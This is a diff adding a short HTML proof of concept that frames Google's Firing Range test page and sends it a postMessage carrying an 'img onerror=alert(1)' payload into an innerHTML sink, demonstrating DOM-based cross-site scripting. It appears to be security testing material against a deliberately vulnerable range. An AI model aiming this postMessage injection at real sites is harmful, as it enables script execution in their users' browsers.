@@ -1,0 +1,19 @@
+<html>
+<body>
+
+<iframe id="x" src="https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml" onload="myFnc()"></iframe>
+
+
+<script>
+function myFnc() {
+	var target = document.getElementById('x');
+        var data = {"html": "<img src=x onerror=alert(1)>"};	
+	target.contentWindow.postMessage(JSON.stringify(data),"*");
+
+}
+
+</script>
+
+
+</body>
+</html>
